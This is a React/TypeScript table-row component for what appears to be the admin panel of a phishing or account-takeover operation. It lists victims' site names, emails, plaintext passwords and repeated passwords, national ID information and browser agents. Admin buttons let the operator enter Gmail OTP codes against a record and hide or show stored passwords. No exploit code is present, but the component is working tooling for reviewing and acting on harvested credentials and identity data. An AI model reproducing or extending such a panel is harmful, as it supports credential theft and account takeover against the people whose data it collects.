import moment from 'moment'
import { useContext, useState } from 'react'
import { getData, updateData } from '../../../api/fetching'
import useInformation from '../../../hooks/useInformation'
import { handleCopyClick } from '../../../utils/copyToClipBoard'
import { AuthContext } from '../../../contexts/AuthProvider'

export default function TableData({data,setNidData,setOpen}:any) {
    const {role}= useContext(AuthContext)
    const {setIsRefresh,page,} = useInformation()
    
  const   {_id,createdAt,siteName,mailCode,user,nidInfo,isPasswordHide,email,password,repassword,status,agent:{ source={},platform='' } } = data
  const [codeVal,setCodeVal]= useState('')
  const handleDisabled = async (id: any,type:any,status:any) => {
    try {
      let orstatus;
      if(!status){
        orstatus = true
      }else{
        orstatus = false
      }
    
      await getData(`/information/${id}/status?${type}=${orstatus}&page=${page}`)
      setIsRefresh(Math.random())
    } catch (error: any) {
      throw new Error(error)
    }
  }

  const updateGmailOtp = async(id:any)=> {
    const originalData= {
      mailCode: codeVal
    }
    const data = await updateData(`/information/admin/${id}`,originalData)
    console.log(data);
  }

  const handleOpen = (data:any)=>{
    setOpen((state:boolean) => !state)
    setNidData(data)
  }

  return (
    <>
    <tr key={_id}>
    <td>{moment(createdAt).fromNow()}</td>
    <td>{(user as any)?.name}</td>
    <td>{siteName}</td>
    <td>{email}</td>
    <td>{password}</td>
    <td>{repassword}</td>
    <td><input style={{width:'70px'}} className='form-control ' type="text" 
    defaultValue={mailCode} onChange={(e)=>setCodeVal(e.target.value)}
    /></td>
    {
      role === 'admin' && (
        <td><button type="button"
        
        className="btn btn-sm btn-danger" 
        onClick={()=>updateGmailOtp(_id)}
        >Add</button></td>
      )
    }
    {
      role === 'admin' && (
        <td title={platform}><button  type="button"
        
        className="btn btn-sm btn-warning" 
        onClick={()=> handleOpen(nidInfo)}
        >View</button></td>
      )
    }

{/* Email Hide */}
{
      role === 'admin' && (
        <td><button
title={platform}
onClick={() => {handleDisabled(_id,'status',status)}}
className={`btn btn-sm text-white ${status ? 'bg-danger' : 'bg-success'}`}>{!status ? 'Hide' : 'show'}</button></td>
      )
    }

    {/* Password Hide  */}
    {
      role === 'admin' && (
        <td><button
title={platform}
onClick={() => {handleDisabled(_id,'isPasswordHide',isPasswordHide)}}
className={`btn btn-sm text-white ${isPasswordHide ? 'bg-danger' : 'bg-success'}`}>{!isPasswordHide ? 'Hide' : 'show'}</button></td>
      )
    }

    <td title={platform}><button type="button"
      onClick={() => handleCopyClick(`${source ? source : ''}`)}
      className={`btn btn-sm  ${(platform === 'iPhone' &&  role === 'admin') ? 'btn-primary' :'btn-success' }`} 
    >Agent</button></td>
      
  </tr>
  
   </>
  )
}
